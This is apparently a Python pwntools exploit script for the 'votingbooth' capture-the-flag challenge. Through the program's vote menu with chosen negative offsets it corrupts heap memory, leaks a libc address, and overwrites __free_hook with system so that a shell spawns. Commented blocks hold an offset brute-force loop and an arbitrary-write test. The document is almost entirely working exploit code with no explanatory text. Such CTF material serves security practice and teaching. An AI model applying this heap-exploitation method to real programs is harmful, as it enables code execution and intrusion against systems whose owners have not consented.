from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './votingbooth'
HOST = 'votingbooth.hackthe.vote'
PORT = 5000

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def vote(name, mylist, offset):
    r.sendlineafter(': ', '1')
    r.sendlineafter(': ', name)
    r.sendlineafter(': ', str(len(mylist)))
    r.sendafter(': ', mylist)
    r.sendlineafter(': ', str(offset))

def show():
    r.sendlineafter(': ', '2')
def revert():
    r.sendlineafter(': ', '3')
def submit():
    r.sendlineafter(': ', '4')

'''
search offset for remote 
for i in range(90, 0x380):
    r = start()
    try:
        vote('a'*99, "A"*0x28, -1*i)

    except:
        r.close()
        continue

    show()
    r.recvuntil('vote: ')
    ret = r.recvuntil('\n', True)
    print hex(i), ret
    if 'a'*99 in ret:
        log.info("find")
        log.info(i)
        break

    r.close()

r.interactive()
# remote -0x70
# local -0x1180
# offset from primary ctx to prime name = 0x1110
# offset from primary ctx to prev name = 0x1010
'''

'''
# aaw primitive
vote('a'*0x19, "B"*0x8, -0x1180)

vote('a'*0x18, "x"*0x28, 0) # free upper side 0x20 chunk
vote('aaaa', "x"*0x28, 0) # free bottom side 0x20 chunk
vote('b', "X"*0x28, - 0x1200) # get two chunk and save this vote
payload = 'a'*0x20 + p64(0xdeadbeef).strip('\x00')
vote(payload, "hoge", 0) # insert payload to name

# vote 10 times to trigger alternate storage
for i in range(10):
    submit()
revert()
submit()
vote(p64(0xc0bebeef), "hoge", 0)
revert()
submit()

r.interactive()
'''

OFFSET = 0x1010
r = start()
if args.R:
    vote('a'*0x20, "A"*0x420, -0x1080+OFFSET)
else:
    vote('a'*0x20, "A"*0x420, -0x1080)
vote('BBBB', "b"*0x28, -0x400)
vote('CCCC', "c"*0x38, 0)
revert()
show()
if args.D:
    debug(r, [0x1b1a])

r.recvuntil('vote: ')
leak = u64(r.recvuntil('\n', True)+'\x00'*2)
dbg('leak')
base = leak - 0x1ebbe0
dbg('base')
fh = base + 0x1eeb28
system = base + 0x55410

if args.R:
    vote('a'*0x10, "@"*0x28, -0x14b0+OFFSET)
    vote('b'*0x19, "B"*0x8, -0x1200+OFFSET)
else:
    vote('a'*0x10, "@"*0x28, -0x14b0)
    vote('b'*0x19, "B"*0x8, -0x1200)
vote('a'*0x18, "x"*0x28, 0) # free upper side 0x20 chunk
vote('aaaa', "x"*0x28, 0) # free bottom side 0x20 chunk

if args.R:
    vote('b', "X"*0x28, -0x1590+OFFSET) # get two 0x20 sized chunk with reverse position
else:
    vote('b', "X"*0x28, -0x1590)
payload = 'a'*0x20 + p64(fh-8).strip('\x00')
vote(payload, "hoge", 0) # insert payload to name

for i in range(10):
    submit()
revert()
submit()
vote("/bin/sh;"+p64(system), "aa", 0)
revert()
submit()
revert()

r.sendlineafter(': ', '1')
r.sendlineafter(': ', '2')
r.sendlineafter(': ', '3')

r.interactive()
r.close()
